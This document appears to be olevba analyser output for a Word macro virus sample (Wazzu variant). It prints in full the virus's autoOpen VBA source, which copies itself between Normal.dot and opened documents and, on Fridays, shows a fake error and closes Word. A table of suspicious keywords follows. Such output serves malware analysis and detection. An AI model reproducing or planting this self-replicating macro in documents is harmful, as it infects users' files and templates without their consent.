olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wazzu.fm
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wazzu.fm - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoOpen.bas 
in file: Virus.MSWord.Wazzu.fm - OLE stream: 'Macros/VBA/autoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim fM$
Dim MF$
On Error GoTo -1: On Error GoTo eC

WordBasic.FileSummaryInfo Update:=1
Dim fff As Object: Set fff = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo fff

fM$ = fff.Directory + "\" + fff.FileName + ":autoOpen"
MF$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
If MF$ = "NORMAL.DOT" Then
WordBasic.MacroCopy "Global:autoOpen", fM$, 1
WordBasic.FileSaveAs Format:=1
Else
WordBasic.MacroCopy fM$, "Global:autoOpen", 1
End If

Ppp
GoTo adios

eC:
adios:

On Error GoTo -1: On Error GoTo 0

End Sub

Private Sub Ppp()
If WordBasic.WeekDay(WordBasic.Now()) = 6 Then
WordBasic.MsgBox "Allgemeiner Fehler Nr. 32768", "Fehler!"
WordBasic.SendKeys "%" + "{F4}"
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

